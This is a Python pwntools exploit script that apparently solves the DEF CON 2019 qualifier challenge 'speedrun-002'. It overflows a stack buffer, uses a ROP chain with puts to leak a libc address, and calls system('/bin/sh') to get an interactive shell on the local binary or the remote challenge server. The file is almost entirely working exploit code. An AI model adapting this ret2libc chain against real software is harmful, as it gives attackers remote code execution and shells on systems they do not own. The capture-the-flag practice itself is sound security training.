#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/defcon-2019-quals/speedrun/speedrun-002/speedrun-002")
elf = ELF(TARGET)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def attach(r):
    if LOCAL:
        bkps = [0x00000000004007CE]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)

    pop_rdi = 0x00000000004008a3
    main 	= 0x00000000004007CE
    puts_got = 0x000000601028
    puts_plt = 0x00000000004005b0
    ret = 0x0000000000400576

    r.sendlineafter("What say you now?\n","Everything intelligent is so boring.")

    p = "A" * 0x400 + "A" * 8
    p += p64(pop_rdi)
    p += p64(puts_got)
    p += p64(puts_plt)
    p += p64(main)
    r.sendlineafter("Tell me more.",p)
    r.recvuntil("Fascinating.\n")
    leak_puts = u64(str(r.recv(8)).replace("\n",'').replace("W",'').ljust(8,'\x00'))
    log.info("leak puts : " + hex(leak_puts))

    libc_base 	= leak_puts - libc.symbols['puts']
    libc_system = libc_base + libc.symbols['system']	
    libc_binsh	= libc_base + libc.search("/bin/sh").next()

    log.info("libc base   : " + hex(libc_base))
    log.info("libc system : " + hex(libc_system))
    log.info("libc /bin/sh: " + hex(libc_binsh))

    p = "A" * 0x400 + "A" * 8
    p += p64(ret)
    p += p64(pop_rdi)
    p += p64(libc_binsh)
    p += p64(libc_system)
    r.sendlineafter("What say you now?\n","Everything intelligent is so boring.")
    r.sendlineafter("Tell me more.",p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("speedrun-002.quals2019.oooverflow.io", 31337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
